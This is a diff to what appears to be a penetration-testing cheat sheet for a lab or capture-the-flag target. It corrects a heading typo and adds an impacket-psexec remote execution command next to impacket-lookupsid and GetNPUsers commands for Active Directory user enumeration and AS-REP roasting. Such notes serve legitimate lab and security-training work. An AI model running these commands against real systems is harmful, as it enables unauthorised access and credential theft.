@@ -72,9 +72,13 @@ https://developer.redis.com/howtos/quick-start/cheat-sheet/
 ```bash
 impacket-lookupsid domain/guest@$ip
 ```
-## Impacker-GetNPUsers
+## Impacket-GetNPUsers
 ```
 impacket-GetNPUsers vulnet-rst.local/ -no-pass -userfile users.txt
+```
+## Impacket-psexec
+```
+impacket-psexec vulnnet-rst.local/a-whitehat@10.10.216.107
 ```
 # Kerbrute
 ```
